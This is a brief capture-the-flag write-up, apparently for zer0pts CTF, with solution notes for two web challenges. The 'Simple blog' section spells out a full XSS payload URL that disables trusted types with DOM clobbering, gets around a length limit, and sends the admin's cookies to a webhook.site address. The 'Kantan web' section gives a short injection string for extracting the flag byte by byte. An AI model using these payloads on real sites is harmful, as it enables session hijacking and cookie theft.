## Simple blog

1. Disable trusted types with dom clobbering
2. Define callback with dom clobbering
3. Bypass length limit with `q:q.innerHTML=b.alt`
4. XSS and steal admin's cookies
```
web.ctf.zer0pts.com:8003/?theme=light"><iframe srcdoc="<input id=defaultPolicy>" name=trustedTypes></iframe><a id=callback href=q:q.innerHTML=b.alt;></a><script id=q></script><input id=b alt='document.location=`https://webhook.site/9abb0e24-59a6-4a0f-b117-5beadcec500a?a=${document.cookie}`'>
```

## Kantan web

`});(Date=_=>(Date+'')[34]+{/*`

extract flag byte by byte
